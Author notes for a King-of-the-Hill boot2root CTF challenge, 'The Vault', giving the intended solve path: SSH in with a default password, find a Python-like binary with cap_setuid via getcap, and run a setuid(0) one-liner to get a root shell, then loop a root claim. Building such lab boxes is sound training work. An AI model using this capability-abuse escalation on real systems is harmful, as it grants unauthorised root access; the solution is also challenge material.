# KotH — The Vault — author notes / verification

**Type:** boot2root King-of-the-Hill (shared SSH box + the `koth` plugin). No
flag to submit; points accrue as `Awards` each tick you hold the hill. See
`challenges/koth/boot2root/README.md` for the shared mechanic and the
root/user (full/half) split.

## Path

1. **Land:** `ssh player@HOST -p PORT` (password `player`). You may already
   write `/home/player/king.txt` → **user** hold, **half** points.
2. **Privesc:** `getcap -r / 2>/dev/null` reveals `/opt/keymaster cap_setuid+ep`: `/opt/keymaster -c 'import os;os.setuid(0);os.system("bash")'`.
3. **Root hold:** `echo <team_token> > /root/king.txt` → **full** points.
4. **Hold:** re-write your file every tick (`solve.sh` loops it, needs `sshpass`).

`solve.sh HOST PORT <team_token>` SSHes in, escalates, and loops the root claim.

## Static verification (docker daemon unavailable in the build env)

- Privesc vector is a documented GTFOBins technique; the base image + this
  hill's one line build the box. Scorer + plugin half/full scoring are covered
  by `base/scorer.py` and `tests/test_plugin_koth.py`. Live end-to-end
  (docker build + SSH + escalation scored by CTFd) is deferred to arena bring-up.
